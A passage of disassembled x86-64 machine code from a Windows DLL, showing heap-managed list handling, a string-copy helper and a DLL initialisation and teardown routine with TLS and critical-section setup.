   180002c3f:	41 5f                	pop    %r15
   180002c41:	41 5e                	pop    %r14
   180002c43:	5f                   	pop    %rdi
   180002c44:	48 ff 25 0d 82 03 00 	rex.W jmp *0x3820d(%rip)        # 0x18003ae58
   180002c4b:	cc                   	int3
   180002c4c:	cc                   	int3
   180002c4d:	cc                   	int3
   180002c4e:	cc                   	int3
   180002c4f:	cc                   	int3
   180002c50:	83 3d 61 f2 03 00 05 	cmpl   $0x5,0x3f261(%rip)        # 0x180041eb8
   180002c57:	73 d6                	jae    0x180002c2f
   180002c59:	48 8b 0d 00 dc 03 00 	mov    0x3dc00(%rip),%rcx        # 0x180040860
   180002c60:	ba 08 00 00 00       	mov    $0x8,%edx
   180002c65:	41 b8 80 44 00 00    	mov    $0x4480,%r8d
   180002c6b:	48 ff 15 36 7d 03 00 	rex.W call *0x37d36(%rip)        # 0x18003a9a8
   180002c72:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002c77:	48 8b d8             	mov    %rax,%rbx
   180002c7a:	48 85 c0             	test   %rax,%rax
   180002c7d:	74 b0                	je     0x180002c2f
   180002c7f:	48 8d 05 3a f8 ff ff 	lea    -0x7c6(%rip),%rax        # 0x1800024c0
   180002c86:	48 89 43 20          	mov    %rax,0x20(%rbx)
   180002c8a:	48 8b 05 37 f2 03 00 	mov    0x3f237(%rip),%rax        # 0x180041ec8
   180002c91:	4c 39 38             	cmp    %r15,(%rax)
   180002c94:	0f 85 8f 00 00 00    	jne    0x180002d29
   180002c9a:	44 01 35 17 f2 03 00 	add    %r14d,0x3f217(%rip)        # 0x180041eb8
   180002ca1:	48 8b cb             	mov    %rbx,%rcx
   180002ca4:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180002ca8:	4c 89 3b             	mov    %r15,(%rbx)
   180002cab:	48 89 18             	mov    %rbx,(%rax)
   180002cae:	48 8b 05 6b f2 03 00 	mov    0x3f26b(%rip),%rax        # 0x180041f20
   180002cb5:	48 89 1d 0c f2 03 00 	mov    %rbx,0x3f20c(%rip)        # 0x180041ec8
   180002cbc:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180002cc0:	49 03 c6             	add    %r14,%rax
   180002cc3:	48 89 05 56 f2 03 00 	mov    %rax,0x3f256(%rip)        # 0x180041f20
   180002cca:	e8 fd f4 ff ff       	call   0x1800021cc
   180002ccf:	8b f0                	mov    %eax,%esi
   180002cd1:	85 c0                	test   %eax,%eax
   180002cd3:	0f 84 77 ff ff ff    	je     0x180002c50
   180002cd9:	3d 03 01 00 00       	cmp    $0x103,%eax
   180002cde:	0f 84 6c ff ff ff    	je     0x180002c50
   180002ce4:	48 8b 03             	mov    (%rbx),%rax
   180002ce7:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   180002ceb:	75 3c                	jne    0x180002d29
   180002ced:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180002cf1:	48 39 19             	cmp    %rbx,(%rcx)
   180002cf4:	75 33                	jne    0x180002d29
   180002cf6:	ff 0d bc f1 03 00    	decl   0x3f1bc(%rip)        # 0x180041eb8
   180002cfc:	4c 8b c3             	mov    %rbx,%r8
   180002cff:	4c 29 35 1a f2 03 00 	sub    %r14,0x3f21a(%rip)        # 0x180041f20
   180002d06:	33 d2                	xor    %edx,%edx
   180002d08:	48 89 01             	mov    %rax,(%rcx)
   180002d0b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180002d0f:	48 8b 0d 4a db 03 00 	mov    0x3db4a(%rip),%rcx        # 0x180040860
   180002d16:	48 ff 15 83 7c 03 00 	rex.W call *0x37c83(%rip)        # 0x18003a9a0
   180002d1d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002d22:	8b fe                	mov    %esi,%edi
   180002d24:	e9 d8 fe ff ff       	jmp    0x180002c01
   180002d29:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002d2e:	cd 29                	int    $0x29
   180002d30:	cc                   	int3
   180002d31:	cc                   	int3
   180002d32:	cc                   	int3
   180002d33:	cc                   	int3
   180002d34:	cc                   	int3
   180002d35:	cc                   	int3
   180002d36:	cc                   	int3
   180002d37:	cc                   	int3
   180002d38:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180002d3d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002d42:	53                   	push   %rbx
   180002d43:	55                   	push   %rbp
   180002d44:	56                   	push   %rsi
   180002d45:	57                   	push   %rdi
   180002d46:	48 83 ec 28          	sub    $0x28,%rsp
   180002d4a:	48 d1 ea             	shr    $1,%rdx
   180002d4d:	33 ed                	xor    %ebp,%ebp
   180002d4f:	48 8b f9             	mov    %rcx,%rdi
   180002d52:	8b f5                	mov    %ebp,%esi
   180002d54:	b9 57 00 07 80       	mov    $0x80070057,%ecx
   180002d59:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   180002d5d:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   180002d63:	0f 47 f1             	cmova  %ecx,%esi
   180002d66:	85 f6                	test   %esi,%esi
   180002d68:	78 3b                	js     0x180002da5
   180002d6a:	48 8d 5a ff          	lea    -0x1(%rdx),%rbx
   180002d6e:	48 8b cf             	mov    %rdi,%rcx
   180002d71:	48 8b d3             	mov    %rbx,%rdx
   180002d74:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   180002d79:	8b f5                	mov    %ebp,%esi
   180002d7b:	48 ff 15 56 7f 03 00 	rex.W call *0x37f56(%rip)        # 0x18003acd8
   180002d82:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002d87:	85 c0                	test   %eax,%eax
   180002d89:	78 0f                	js     0x180002d9a
   180002d8b:	48 98                	cltq
   180002d8d:	48 3b c3             	cmp    %rbx,%rax
   180002d90:	77 08                	ja     0x180002d9a
   180002d92:	75 19                	jne    0x180002dad
   180002d94:	66 89 2c 5f          	mov    %bp,(%rdi,%rbx,2)
   180002d98:	eb 13                	jmp    0x180002dad
   180002d9a:	66 89 2c 5f          	mov    %bp,(%rdi,%rbx,2)
   180002d9e:	be 7a 00 07 80       	mov    $0x8007007a,%esi
   180002da3:	eb 08                	jmp    0x180002dad
   180002da5:	48 85 d2             	test   %rdx,%rdx
   180002da8:	74 03                	je     0x180002dad
   180002daa:	66 89 2f             	mov    %bp,(%rdi)
   180002dad:	8b c6                	mov    %esi,%eax
   180002daf:	48 83 c4 28          	add    $0x28,%rsp
   180002db3:	5f                   	pop    %rdi
   180002db4:	5e                   	pop    %rsi
   180002db5:	5d                   	pop    %rbp
   180002db6:	5b                   	pop    %rbx
   180002db7:	c3                   	ret
   180002db8:	cc                   	int3
   180002db9:	cc                   	int3
   180002dba:	cc                   	int3
   180002dbb:	cc                   	int3
   180002dbc:	cc                   	int3
   180002dbd:	cc                   	int3
   180002dbe:	cc                   	int3
   180002dbf:	cc                   	int3
   180002dc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002dc5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180002dca:	57                   	push   %rdi
   180002dcb:	48 83 ec 20          	sub    $0x20,%rsp
   180002dcf:	33 ff                	xor    %edi,%edi
   180002dd1:	be 01 00 00 00       	mov    $0x1,%esi
   180002dd6:	85 d2                	test   %edx,%edx
   180002dd8:	0f 84 1d 03 00 00    	je     0x1800030fb
   180002dde:	2b d6                	sub    %esi,%edx
   180002de0:	74 48                	je     0x180002e2a
   180002de2:	83 fa 02             	cmp    $0x2,%edx
   180002de5:	0f 85 6b 05 00 00    	jne    0x180003356
   180002deb:	8b 0d ef ef 03 00    	mov    0x3efef(%rip),%ecx        # 0x180041de0
   180002df1:	48 ff 15 d8 7c 03 00 	rex.W call *0x37cd8(%rip)        # 0x18003aad0
   180002df8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002dfd:	48 8b d8             	mov    %rax,%rbx
   180002e00:	48 85 c0             	test   %rax,%rax
   180002e03:	0f 84 4d 05 00 00    	je     0x180003356
   180002e09:	8b 0d d1 ef 03 00    	mov    0x3efd1(%rip),%ecx        # 0x180041de0
   180002e0f:	33 d2                	xor    %edx,%edx
   180002e11:	48 ff 15 f8 7c 03 00 	rex.W call *0x37cf8(%rip)        # 0x18003ab10
   180002e18:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002e1d:	48 8b cb             	mov    %rbx,%rcx
   180002e20:	e8 5b be 00 00       	call   0x18000ec80
   180002e25:	e9 2c 05 00 00       	jmp    0x180003356
   180002e2a:	48 89 0d 27 da 03 00 	mov    %rcx,0x3da27(%rip)        # 0x180040858
   180002e31:	48 ff 15 e0 7d 03 00 	rex.W call *0x37de0(%rip)        # 0x18003ac18
   180002e38:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002e3d:	8b c8                	mov    %eax,%ecx
   180002e3f:	48 ff 15 5a 7f 03 00 	rex.W call *0x37f5a(%rip)        # 0x18003ada0
   180002e46:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002e4b:	e8 d4 44 03 00       	call   0x180037324
   180002e50:	48 8d 0d 59 f0 03 00 	lea    0x3f059(%rip),%rcx        # 0x180041eb0
   180002e57:	48 ff 15 d2 7c 03 00 	rex.W call *0x37cd2(%rip)        # 0x18003ab30
   180002e5e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002e63:	85 c0                	test   %eax,%eax
   180002e65:	0f 84 32 02 00 00    	je     0x18000309d
   180002e6b:	48 ff 15 3e 7b 03 00 	rex.W call *0x37b3e(%rip)        # 0x18003a9b0
   180002e72:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002e77:	48 89 05 e2 d9 03 00 	mov    %rax,0x3d9e2(%rip)        # 0x180040860
   180002e7e:	48 85 c0             	test   %rax,%rax
   180002e81:	0f 84 16 02 00 00    	je     0x18000309d
   180002e87:	39 3d e3 d9 03 00    	cmp    %edi,0x3d9e3(%rip)        # 0x180040870
   180002e8d:	75 70                	jne    0x180002eff
   180002e8f:	48 ff 15 5a 7c 03 00 	rex.W call *0x37c5a(%rip)        # 0x18003aaf0
   180002e96:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002e9b:	89 05 3f ef 03 00    	mov    %eax,0x3ef3f(%rip)        # 0x180041de0
   180002ea1:	83 f8 ff             	cmp    $0xffffffff,%eax
   180002ea4:	74 4d                	je     0x180002ef3
   180002ea6:	48 8d 0d f3 ee 03 00 	lea    0x3eef3(%rip),%rcx        # 0x180041da0
   180002ead:	48 ff 15 ac 7f 03 00 	rex.W call *0x37fac(%rip)        # 0x18003ae60
   180002eb4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002eb9:	85 c0                	test   %eax,%eax
   180002ebb:	74 1b                	je     0x180002ed8
   180002ebd:	8b 0d 1d ef 03 00    	mov    0x3ef1d(%rip),%ecx        # 0x180041de0
   180002ec3:	48 ff 15 1e 7c 03 00 	rex.W call *0x37c1e(%rip)        # 0x18003aae8
   180002eca:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002ecf:	83 0d 0a ef 03 00 ff 	orl    $0xffffffff,0x3ef0a(%rip)        # 0x180041de0
   180002ed6:	eb 1b                	jmp    0x180002ef3
   180002ed8:	48 8d 1d f1 ee 03 00 	lea    0x3eef1(%rip),%rbx        # 0x180041dd0
   180002edf:	89 35 8b d9 03 00    	mov    %esi,0x3d98b(%rip)        # 0x180040870
   180002ee5:	48 89 1d ec ee 03 00 	mov    %rbx,0x3eeec(%rip)        # 0x180041dd8
   180002eec:	48 89 1d dd ee 03 00 	mov    %rbx,0x3eedd(%rip)        # 0x180041dd0
   180002ef3:	39 3d 77 d9 03 00    	cmp    %edi,0x3d977(%rip)        # 0x180040870
   180002ef9:	0f 84 9e 01 00 00    	je     0x18000309d
   180002eff:	39 3d 3b db 03 00    	cmp    %edi,0x3db3b(%rip)        # 0x180040a40
   180002f05:	75 1b                	jne    0x180002f22
   180002f07:	48 8d 05 e2 e5 03 00 	lea    0x3e5e2(%rip),%rax        # 0x1800414f0
   180002f0e:	89 35 2c db 03 00    	mov    %esi,0x3db2c(%rip)        # 0x180040a40
   180002f14:	48 89 05 dd e5 03 00 	mov    %rax,0x3e5dd(%rip)        # 0x1800414f8
   180002f1b:	48 89 05 ce e5 03 00 	mov    %rax,0x3e5ce(%rip)        # 0x1800414f0
   180002f22:	8b 05 08 db 03 00    	mov    0x3db08(%rip),%eax        # 0x180040a30
   180002f28:	85 c0                	test   %eax,%eax
   180002f2a:	0f 44 c6             	cmove  %esi,%eax
   180002f2d:	89 05 fd da 03 00    	mov    %eax,0x3dafd(%rip)        # 0x180040a30
   180002f33:	8b 05 0b db 03 00    	mov    0x3db0b(%rip),%eax        # 0x180040a44
   180002f39:	85 c0                	test   %eax,%eax
   180002f3b:	0f 44 c6             	cmove  %esi,%eax
   180002f3e:	89 05 00 db 03 00    	mov    %eax,0x3db00(%rip)        # 0x180040a44
   180002f44:	39 3d 02 d9 03 00    	cmp    %edi,0x3d902(%rip)        # 0x18004084c
   180002f4a:	75 34                	jne    0x180002f80
   180002f4c:	48 8d 05 ed ef 03 00 	lea    0x3efed(%rip),%rax        # 0x180041f40
   180002f53:	33 d2                	xor    %edx,%edx
   180002f55:	48 8d 0d 04 f0 03 00 	lea    0x3f004(%rip),%rcx        # 0x180041f60
   180002f5c:	48 89 05 e5 ef 03 00 	mov    %rax,0x3efe5(%rip)        # 0x180041f48
   180002f63:	48 89 05 d6 ef 03 00 	mov    %rax,0x3efd6(%rip)        # 0x180041f40
   180002f6a:	44 8d 42 40          	lea    0x40(%rdx),%r8d
   180002f6e:	e8 8b 66 03 00       	call   0x1800395fe
   180002f73:	48 89 3d d6 ef 03 00 	mov    %rdi,0x3efd6(%rip)        # 0x180041f50
   180002f7a:	89 35 cc d8 03 00    	mov    %esi,0x3d8cc(%rip)        # 0x18004084c
   180002f80:	e8 07 a6 00 00       	call   0x18000d58c
   180002f85:	85 c0                	test   %eax,%eax
   180002f87:	0f 84 10 01 00 00    	je     0x18000309d
   180002f8d:	39 3d d9 d8 03 00    	cmp    %edi,0x3d8d9(%rip)        # 0x18004086c
   180002f93:	75 1b                	jne    0x180002fb0
   180002f95:	48 8d 05 54 ee 03 00 	lea    0x3ee54(%rip),%rax        # 0x180041df0
   180002f9c:	89 35 ca d8 03 00    	mov    %esi,0x3d8ca(%rip)        # 0x18004086c
   180002fa2:	48 89 05 4f ee 03 00 	mov    %rax,0x3ee4f(%rip)        # 0x180041df8
   180002fa9:	48 89 05 40 ee 03 00 	mov    %rax,0x3ee40(%rip)        # 0x180041df0
   180002fb0:	39 3d 92 d8 03 00    	cmp    %edi,0x3d892(%rip)        # 0x180040848
   180002fb6:	75 5f                	jne    0x180003017
   180002fb8:	48 8d 05 11 f0 03 00 	lea    0x3f011(%rip),%rax        # 0x180041fd0
   180002fbf:	48 89 3d da ef 03 00 	mov    %rdi,0x3efda(%rip)        # 0x180041fa0
   180002fc6:	48 89 05 0b f0 03 00 	mov    %rax,0x3f00b(%rip)        # 0x180041fd8
   180002fcd:	48 89 05 fc ef 03 00 	mov    %rax,0x3effc(%rip)        # 0x180041fd0
   180002fd4:	48 8d 05 05 f0 03 00 	lea    0x3f005(%rip),%rax        # 0x180041fe0
   180002fdb:	48 89 05 06 f0 03 00 	mov    %rax,0x3f006(%rip)        # 0x180041fe8
   180002fe2:	48 89 05 f7 ef 03 00 	mov    %rax,0x3eff7(%rip)        # 0x180041fe0
   180002fe9:	48 89 3d b8 ef 03 00 	mov    %rdi,0x3efb8(%rip)        # 0x180041fa8
   180002ff0:	48 89 3d b9 ef 03 00 	mov    %rdi,0x3efb9(%rip)        # 0x180041fb0
   180002ff7:	89 35 4b d8 03 00    	mov    %esi,0x3d84b(%rip)        # 0x180040848
   180002ffd:	48 89 3d bc ef 03 00 	mov    %rdi,0x3efbc(%rip)        # 0x180041fc0
   180003004:	48 89 3d bd ef 03 00 	mov    %rdi,0x3efbd(%rip)        # 0x180041fc8
   18000300b:	89 3d a7 ef 03 00    	mov    %edi,0x3efa7(%rip)        # 0x180041fb8
   180003011:	89 3d a5 ef 03 00    	mov    %edi,0x3efa5(%rip)        # 0x180041fbc
   180003017:	39 3d 83 da 03 00    	cmp    %edi,0x3da83(%rip)        # 0x180040aa0
   18000301d:	75 1a                	jne    0x180003039
   18000301f:	e8 c8 c1 02 00       	call   0x18002f1ec
   180003024:	8b 0d 76 da 03 00    	mov    0x3da76(%rip),%ecx        # 0x180040aa0
   18000302a:	3b c6                	cmp    %esi,%eax
   18000302c:	0f 44 ce             	cmove  %esi,%ecx
   18000302f:	89 0d 6b da 03 00    	mov    %ecx,0x3da6b(%rip)        # 0x180040aa0
   180003035:	85 c9                	test   %ecx,%ecx
   180003037:	74 64                	je     0x18000309d
   180003039:	48 39 3d 48 da 03 00 	cmp    %rdi,0x3da48(%rip)        # 0x180040a88
   180003040:	75 62                	jne    0x1800030a4
   180003042:	48 8b 0d 17 d8 03 00 	mov    0x3d817(%rip),%rcx        # 0x180040860
   180003049:	33 d2                	xor    %edx,%edx
   18000304b:	44 8d 42 28          	lea    0x28(%rdx),%r8d
   18000304f:	48 ff 15 52 79 03 00 	rex.W call *0x37952(%rip)        # 0x18003a9a8
   180003056:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000305b:	48 89 05 26 da 03 00 	mov    %rax,0x3da26(%rip)        # 0x180040a88
   180003062:	48 85 c0             	test   %rax,%rax
   180003065:	74 36                	je     0x18000309d
   180003067:	48 8b c8             	mov    %rax,%rcx
   18000306a:	48 ff 15 ef 7d 03 00 	rex.W call *0x37def(%rip)        # 0x18003ae60
   180003071:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003076:	85 c0                	test   %eax,%eax
   180003078:	74 2a                	je     0x1800030a4
   18000307a:	4c 8b 05 07 da 03 00 	mov    0x3da07(%rip),%r8        # 0x180040a88
   180003081:	33 d2                	xor    %edx,%edx
   180003083:	48 8b 0d d6 d7 03 00 	mov    0x3d7d6(%rip),%rcx        # 0x180040860
   18000308a:	48 ff 15 0f 79 03 00 	rex.W call *0x3790f(%rip)        # 0x18003a9a0
   180003091:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003096:	48 89 3d eb d9 03 00 	mov    %rdi,0x3d9eb(%rip)        # 0x180040a88
   18000309d:	33 c0                	xor    %eax,%eax
   18000309f:	e9 b4 02 00 00       	jmp    0x180003358
   1800030a4:	e8 eb a4 01 00       	call   0x18001d594
   1800030a9:	85 c0                	test   %eax,%eax
   1800030ab:	74 f0                	je     0x18000309d
   1800030ad:	33 d2                	xor    %edx,%edx
   1800030af:	48 8d 0d ca e4 03 00 	lea    0x3e4ca(%rip),%rcx        # 0x180041580
   1800030b6:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   1800030bc:	e8 3d 65 03 00       	call   0x1800395fe
   1800030c1:	39 3d cd d9 03 00    	cmp    %edi,0x3d9cd(%rip)        # 0x180040a94
   1800030c7:	75 1d                	jne    0x1800030e6
   1800030c9:	48 8d 0d f0 e2 03 00 	lea    0x3e2f0(%rip),%rcx        # 0x1800413c0
   1800030d0:	48 ff 15 89 7d 03 00 	rex.W call *0x37d89(%rip)        # 0x18003ae60
   1800030d7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800030dc:	85 c0                	test   %eax,%eax
   1800030de:	75 bd                	jne    0x18000309d
   1800030e0:	89 35 ae d9 03 00    	mov    %esi,0x3d9ae(%rip)        # 0x180040a94
   1800030e6:	e8 dd 34 03 00       	call   0x1800365c8
   1800030eb:	85 c0                	test   %eax,%eax
   1800030ed:	74 ae                	je     0x18000309d
   1800030ef:	48 89 3d 6a e4 03 00 	mov    %rdi,0x3e46a(%rip)        # 0x180041560
   1800030f6:	e9 5b 02 00 00       	jmp    0x180003356
   1800030fb:	4d 85 c0             	test   %r8,%r8
   1800030fe:	0f 85 52 02 00 00    	jne    0x180003356
   180003104:	48 8b cf             	mov    %rdi,%rcx
   180003107:	48 87 0d 52 e4 03 00 	xchg   %rcx,0x3e452(%rip)        # 0x180041560
   18000310e:	48 85 c9             	test   %rcx,%rcx
   180003111:	74 0c                	je     0x18000311f
   180003113:	48 ff 15 f6 7c 03 00 	rex.W call *0x37cf6(%rip)        # 0x18003ae10
   18000311a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000311f:	39 3d 87 d9 03 00    	cmp    %edi,0x3d987(%rip)        # 0x180040aac
   180003125:	74 47                	je     0x18000316e
   180003127:	39 35 87 d9 03 00    	cmp    %esi,0x3d987(%rip)        # 0x180040ab4
   18000312d:	75 19                	jne    0x180003148
   18000312f:	48 8d 0d 0a da 03 00 	lea    0x3da0a(%rip),%rcx        # 0x180040b40
   180003136:	48 ff 15 13 7d 03 00 	rex.W call *0x37d13(%rip)        # 0x18003ae50
   18000313d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003142:	89 3d 6c d9 03 00    	mov    %edi,0x3d96c(%rip)        # 0x180040ab4
   180003148:	48 8d 0d 31 da 03 00 	lea    0x3da31(%rip),%rcx        # 0x180040b80
   18000314f:	48 ff 15 fa 7c 03 00 	rex.W call *0x37cfa(%rip)        # 0x18003ae50
   180003156:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000315b:	48 8d 0d 5e da 03 00 	lea    0x3da5e(%rip),%rcx        # 0x180040bc0
   180003162:	48 ff 15 e7 7c 03 00 	rex.W call *0x37ce7(%rip)        # 0x18003ae50
   180003169:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000316e:	39 35 20 d9 03 00    	cmp    %esi,0x3d920(%rip)        # 0x180040a94
   180003174:	75 19                	jne    0x18000318f
   180003176:	48 8d 0d 43 e2 03 00 	lea    0x3e243(%rip),%rcx        # 0x1800413c0
   18000317d:	48 ff 15 cc 7c 03 00 	rex.W call *0x37ccc(%rip)        # 0x18003ae50
   180003184:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003189:	89 3d 05 d9 03 00    	mov    %edi,0x3d905(%rip)        # 0x180040a94
   18000318f:	40 38 3d d7 d8 03 00 	cmp    %dil,0x3d8d7(%rip)        # 0x180040a6d
   180003196:	74 36                	je     0x1800031ce
   180003198:	40 38 3d cd d8 03 00 	cmp    %dil,0x3d8cd(%rip)        # 0x180040a6c
   18000319f:	75 2d                	jne    0x1800031ce
   1800031a1:	48 8d 0d b8 e2 03 00 	lea    0x3e2b8(%rip),%rcx        # 0x180041460
   1800031a8:	48 ff 15 a1 7c 03 00 	rex.W call *0x37ca1(%rip)        # 0x18003ae50
   1800031af:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800031b4:	48 8d 0d 05 e3 03 00 	lea    0x3e305(%rip),%rcx        # 0x1800414c0
   1800031bb:	48 ff 15 8e 7c 03 00 	rex.W call *0x37c8e(%rip)        # 0x18003ae50
   1800031c2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800031c7:	40 88 3d 9f d8 03 00 	mov    %dil,0x3d89f(%rip)        # 0x180040a6d
   1800031ce:	48 8b 0d b3 d8 03 00 	mov    0x3d8b3(%rip),%rcx        # 0x180040a88
   1800031d5:	48 85 c9             	test   %rcx,%rcx
   1800031d8:	74 2f                	je     0x180003209
   1800031da:	48 ff 15 6f 7c 03 00 	rex.W call *0x37c6f(%rip)        # 0x18003ae50
   1800031e1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800031e6:	4c 8b 05 9b d8 03 00 	mov    0x3d89b(%rip),%r8        # 0x180040a88
   1800031ed:	33 d2                	xor    %edx,%edx
   1800031ef:	48 8b 0d 6a d6 03 00 	mov    0x3d66a(%rip),%rcx        # 0x180040860
   1800031f6:	48 ff 15 a3 77 03 00 	rex.W call *0x377a3(%rip)        # 0x18003a9a0
   1800031fd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003202:	48 89 3d 7f d8 03 00 	mov    %rdi,0x3d87f(%rip)        # 0x180040a88
   180003209:	39 35 91 d8 03 00    	cmp    %esi,0x3d891(%rip)        # 0x180040aa0
   18000320f:	75 3a                	jne    0x18000324b
   180003211:	39 35 91 d8 03 00    	cmp    %esi,0x3d891(%rip)        # 0x180040aa8
   180003217:	75 2c                	jne    0x180003245
   180003219:	48 8b 0d 08 da 03 00 	mov    0x3da08(%rip),%rcx        # 0x180040c28
   180003220:	48 ff 15 01 7a 03 00 	rex.W call *0x37a01(%rip)        # 0x18003ac28
   180003227:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000322c:	48 8d 0d 8d da 03 00 	lea    0x3da8d(%rip),%rcx        # 0x180040cc0
   180003233:	48 ff 15 16 7c 03 00 	rex.W call *0x37c16(%rip)        # 0x18003ae50
   18000323a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000323f:	89 3d 63 d8 03 00    	mov    %edi,0x3d863(%rip)        # 0x180040aa8
   180003245:	89 3d 55 d8 03 00    	mov    %edi,0x3d855(%rip)        # 0x180040aa0
   18000324b:	8b 05 f7 d5 03 00    	mov    0x3d5f7(%rip),%eax        # 0x180040848
   180003251:	3b c6                	cmp    %esi,%eax
   180003253:	0f 44 c7             	cmove  %edi,%eax
   180003256:	89 05 ec d5 03 00    	mov    %eax,0x3d5ec(%rip)        # 0x180040848
   18000325c:	8b 05 0a d6 03 00    	mov    0x3d60a(%rip),%eax        # 0x18004086c
   180003262:	3b c6                	cmp    %esi,%eax
   180003264:	0f 44 c7             	cmove  %edi,%eax
   180003267:	39 35 fb d5 03 00    	cmp    %esi,0x3d5fb(%rip)        # 0x180040868
   18000326d:	89 05 f9 d5 03 00    	mov    %eax,0x3d5f9(%rip)        # 0x18004086c
   180003273:	75 3f                	jne    0x1800032b4
   180003275:	48 8d 0d e4 eb 03 00 	lea    0x3ebe4(%rip),%rcx        # 0x180041e60
   18000327c:	48 ff 15 cd 7b 03 00 	rex.W call *0x37bcd(%rip)        # 0x18003ae50
   180003283:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003288:	48 8b 0d 09 ec 03 00 	mov    0x3ec09(%rip),%rcx        # 0x180041e98
   18000328f:	48 ff 15 fa 76 03 00 	rex.W call *0x376fa(%rip)        # 0x18003a990
   180003296:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000329b:	48 8b 0d 66 eb 03 00 	mov    0x3eb66(%rip),%rcx        # 0x180041e08
   1800032a2:	48 ff 15 e7 76 03 00 	rex.W call *0x376e7(%rip)        # 0x18003a990
   1800032a9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800032ae:	89 3d b4 d5 03 00    	mov    %edi,0x3d5b4(%rip)        # 0x180040868
   1800032b4:	8b 05 92 d5 03 00    	mov    0x3d592(%rip),%eax        # 0x18004084c
   1800032ba:	3b c6                	cmp    %esi,%eax
   1800032bc:	0f 44 c7             	cmove  %edi,%eax
   1800032bf:	89 05 87 d5 03 00    	mov    %eax,0x3d587(%rip)        # 0x18004084c
   1800032c5:	8b 05 79 d7 03 00    	mov    0x3d779(%rip),%eax        # 0x180040a44
   1800032cb:	3b c6                	cmp    %esi,%eax
   1800032cd:	0f 44 c7             	cmove  %edi,%eax
   1800032d0:	89 05 6e d7 03 00    	mov    %eax,0x3d76e(%rip)        # 0x180040a44
   1800032d6:	8b 05 54 d7 03 00    	mov    0x3d754(%rip),%eax        # 0x180040a30
   1800032dc:	3b c6                	cmp    %esi,%eax
   1800032de:	0f 44 c7             	cmove  %edi,%eax
   1800032e1:	89 05 49 d7 03 00    	mov    %eax,0x3d749(%rip)        # 0x180040a30
   1800032e7:	8b 05 53 d7 03 00    	mov    0x3d753(%rip),%eax        # 0x180040a40
   1800032ed:	3b c6                	cmp    %esi,%eax
   1800032ef:	0f 44 c7             	cmove  %edi,%eax
   1800032f2:	39 3d 78 d5 03 00    	cmp    %edi,0x3d578(%rip)        # 0x180040870
   1800032f8:	89 05 42 d7 03 00    	mov    %eax,0x3d742(%rip)        # 0x180040a40
   1800032fe:	74 4f                	je     0x18000334f
   180003300:	8b 0d da ea 03 00    	mov    0x3eada(%rip),%ecx        # 0x180041de0
   180003306:	48 ff 15 db 77 03 00 	rex.W call *0x377db(%rip)        # 0x18003aae8
   18000330d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003312:	83 0d c7 ea 03 00 ff 	orl    $0xffffffff,0x3eac7(%rip)        # 0x180041de0
   180003319:	48 8d 1d b0 ea 03 00 	lea    0x3eab0(%rip),%rbx        # 0x180041dd0
   180003320:	eb 08                	jmp    0x18000332a
   180003322:	48 8b c8             	mov    %rax,%rcx
   180003325:	e8 56 b9 00 00       	call   0x18000ec80
   18000332a:	48 8b 05 9f ea 03 00 	mov    0x3ea9f(%rip),%rax        # 0x180041dd0
   180003331:	48 3b c3             	cmp    %rbx,%rax
   180003334:	75 ec                	jne    0x180003322
   180003336:	48 8d 0d 63 ea 03 00 	lea    0x3ea63(%rip),%rcx        # 0x180041da0
   18000333d:	48 ff 15 0c 7b 03 00 	rex.W call *0x37b0c(%rip)        # 0x18003ae50
   180003344:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003349:	89 3d 21 d5 03 00    	mov    %edi,0x3d521(%rip)        # 0x180040870
   18000334f:	48 89 3d 0a d5 03 00 	mov    %rdi,0x3d50a(%rip)        # 0x180040860
   180003356:	8b c6                	mov    %esi,%eax
   180003358:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000335d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
